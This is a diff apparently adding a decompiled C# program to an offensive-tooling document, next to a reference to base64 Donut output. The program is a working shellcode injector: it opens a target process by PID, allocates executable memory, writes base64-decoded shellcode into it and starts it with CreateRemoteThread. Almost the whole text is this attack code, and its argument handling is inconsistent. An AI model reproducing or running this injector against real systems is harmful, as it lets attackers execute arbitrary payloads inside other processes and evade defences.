@@ -293,3 +293,126 @@ $base64 = $donutfile
 }
 }
 ```
+
+```csharp
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace ShellcodeTest
+{
+	// Token: 0x02000002 RID: 2
+	public class Program
+	{
+		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00001050
+		public static void Main(string[] args)
+		{
+			if (args.Length <= 1)
+			{
+				Program.pid = Convert.ToInt32(args[0]);
+			}
+			Program.x86 = args[1];
+			Program.x64 = args[1];
+			Program.Inject(Program.x86, Program.x64, Program.pid);
+		}
+
+		// Token: 0x06000002 RID: 2
+		[DllImport("kernel32.dll")]
+		public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+		// Token: 0x06000003 RID: 3
+		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+		public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+		// Token: 0x06000004 RID: 4
+		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+		// Token: 0x06000005 RID: 5
+		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
+		private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+		// Token: 0x06000006 RID: 6
+		[DllImport("kernel32.dll", SetLastError = true)]
+		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+		// Token: 0x06000007 RID: 7
+		[DllImport("kernel32.dll")]
+		private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+		// Token: 0x06000008 RID: 8 RVA: 0x0000209C File Offset: 0x0000109C
+		public static int Inject(string x86, string x64, int procPID)
+		{
+			Process processById = Process.GetProcessById(procPID);
+			Console.WriteLine(processById.Id);
+			string text;
+			if (Program.IsWow64Process(processById))
+			{
+				text = x86;
+			}
+			else
+			{
+				text = x64;
+			}
+			byte[] array = Convert.FromBase64String(text);
+			IntPtr intPtr = Program.OpenProcess(1082, false, processById.Id);
+			checked
+			{
+				IntPtr intPtr2 = Program.VirtualAllocEx(intPtr, IntPtr.Zero, (uint)array.Length, 12288U, 64U);
+				UIntPtr uintPtr;
+				Program.WriteProcessMemory(intPtr, intPtr2, array, (uint)array.Length, out uintPtr);
+				Program.CreateRemoteThread(intPtr, IntPtr.Zero, 0U, intPtr2, IntPtr.Zero, 0U, IntPtr.Zero);
+				return 0;
+			}
+		}
+
+		// Token: 0x06000009 RID: 9
+		[DllImport("kernel32.dll")]
+		public static extern bool IsWow64Process(IntPtr hProcess, out bool lpSystemInfo);
+
+		// Token: 0x0600000A RID: 10 RVA: 0x00002134 File Offset: 0x00001134
+		public static bool IsWow64Process(Process process)
+		{
+			bool flag = false;
+			Program.IsWow64Process(process.Handle, out flag);
+			return flag;
+		}
+
+		// Token: 0x04000001 RID: 1
+		private const int PROCESS_CREATE_THREAD = 2;
+
+		// Token: 0x04000002 RID: 2
+		private const int PROCESS_QUERY_INFORMATION = 1024;
+
+		// Token: 0x04000003 RID: 3
+		private const int PROCESS_VM_OPERATION = 8;
+
+		// Token: 0x04000004 RID: 4
+		private const int PROCESS_VM_WRITE = 32;
+
+		// Token: 0x04000005 RID: 5
+		private const int PROCESS_VM_READ = 16;
+
+		// Token: 0x04000006 RID: 6
+		private const uint MEM_COMMIT = 4096U;
+
+		// Token: 0x04000007 RID: 7
+		private const uint MEM_RESERVE = 8192U;
+
+		// Token: 0x04000008 RID: 8
+		private const uint PAGE_READWRITE = 4U;
+
+		// Token: 0x04000009 RID: 9
+		private const uint PAGE_EXECUTE_READWRITE = 64U;
+
+		// Token: 0x0400000A RID: 10
+		private static string x64 = "";
+
+		// Token: 0x0400000B RID: 11
+		private static string x86 = "";
+
+		// Token: 0x0400000C RID: 12
+		private static int pid = Process.GetCurrentProcess().Id;
+	}
+}
+```
